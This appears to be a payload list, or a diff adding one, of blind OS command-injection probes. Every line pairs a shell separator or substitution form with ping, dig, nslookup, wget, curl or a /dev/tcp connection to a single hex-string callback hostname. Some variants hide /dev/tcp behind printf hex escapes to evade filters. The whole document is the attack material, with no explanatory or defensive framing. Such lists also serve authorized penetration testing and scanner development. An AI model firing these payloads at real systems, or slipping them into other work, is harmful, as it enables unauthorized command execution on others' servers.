+$(ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537)
+`ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537`
+`ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537`
+; dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; 
+; dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; 
+; dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; 
+; dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; 
+ && false || dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 && 
+ && false || dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 && 
+ && false || dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1 && 
+ && false || dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1 && 
+"; dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; "
+"; dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; "
+'; dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; '
+'; dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; '
+"; dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; "
+"; dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; "
+'; dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; '
+'; dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; '
+dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537
+dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537
+bash -c "$@" x eval dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537;
+bash -c "$@" x eval dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537;
+$(dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537)
+$(dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537)
+`dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537`
+`dig a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537`
+; nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; 
+; nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; 
+; nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; 
+; nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; 
+ && false || nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 && 
+ && false || nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 && 
+ && false || nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1 && 
+ && false || nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1 && 
+"; nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; "
+"; nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; "
+'; nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; '
+'; nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; '
+"; nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; "
+"; nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; "
+'; nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; '
+'; nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; '
+nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537
+nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537
+bash -c "$@" x eval nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537;
+bash -c "$@" x eval nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537;
+$(nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537)
+$(nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537)
+`nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537`
+`nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537`
+; wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null; 
+; wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null; 
+; wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null 2>&1; 
+; wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null 2>&1; 
+ && false || wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null && 
+ && false || wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null && 
+ && false || wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null 2>&1 && 
+ && false || wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null 2>&1 && 
+"; wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null; "
+"; wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null; "
+'; wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null; '
+'; wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null; '
+"; wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null 2>&1; "
+"; wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null 2>&1; "
+'; wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null 2>&1; '
+'; wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null 2>&1; '
+wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null
+wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null
+bash -c "$@" x eval wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null;
+bash -c "$@" x eval wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null;
+$(wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null)
+$(wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null)
+`wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null`
+`wget http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ -O /dev/null`
+; curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/; 
+; curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/; 
+; curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ 2>&1; 
+; curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ 2>&1; 
+ && false || curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ && 
+ && false || curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ && 
+ && false || curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ 2>&1 && 
+ && false || curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ 2>&1 && 
+"; curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/; "
+"; curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/; "
+'; curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/; '
+'; curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/; '
+"; curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ 2>&1; "
+"; curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ 2>&1; "
+'; curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ 2>&1; '
+'; curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/ 2>&1; '
+curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/
+curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/
+bash -c "$@" x eval curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/;
+bash -c "$@" x eval curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/;
+$(curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/)
+$(curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/)
+`curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/`
+`curl http://a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/`
+; curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; 
+; curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; 
+; curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; 
+; curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; 
+ && false || curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 && 
+ && false || curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 && 
+ && false || curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1 && 
+ && false || curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1 && 
+"; curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; "
+"; curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; "
+'; curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; '
+'; curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; '
+"; curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; "
+"; curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; "
+'; curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; '
+'; curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; '
+curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537
+curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537
+bash -c "$@" x eval curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537;
+bash -c "$@" x eval curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537;
+$(curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537)
+$(curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537)
+`curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537`
+`curl a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537`
+; true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80; 
+; true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80; 
+; true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80 2>&1; 
+; true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80 2>&1; 
+ && false || true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80 && 
+ && false || true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80 && 
+ && false || true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80 2>&1 && 
+ && false || true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80 2>&1 && 
+"; true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80; "
+"; true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80; "
+'; true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80; '
+'; true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80; '
+"; true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80 2>&1; "
+"; true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80 2>&1; "
+'; true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80 2>&1; '
+'; true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80 2>&1; '
+true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80
+true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80
+bash -c "$@" x eval true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80;
+bash -c "$@" x eval true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80;
+$(true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80)
+$(true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80)
+`true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80`
+`true < /dev/tcp/a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537/80`
+; true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)"; 
+; true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)"; 
+; true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)" 2>&1; 
+; true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)" 2>&1; 
+ && false || true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)" && 
+ && false || true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)" && 
+ && false || true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)" 2>&1 && 
+ && false || true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)" 2>&1 && 
+"; true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)"; "
+"; true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)"; "
+'; true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)"; '
+'; true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)"; '
+"; true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)" 2>&1; "
+"; true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)" 2>&1; "
+'; true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)" 2>&1; '
+'; true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)" 2>&1; '
+true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)"
+true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)"
+bash -c "$@" x eval true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)";
+bash -c "$@" x eval true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)";
+$(true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)")
+$(true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)")
+`true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)"`
+`true < "$(printf \\x2fdev\\x2ftcp\\x2fa9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537\\x2f80)"`
+ & ping -n 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 & 
+ & ping -n 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 & 
+ & nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 & 
+ & nslookup a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 & 
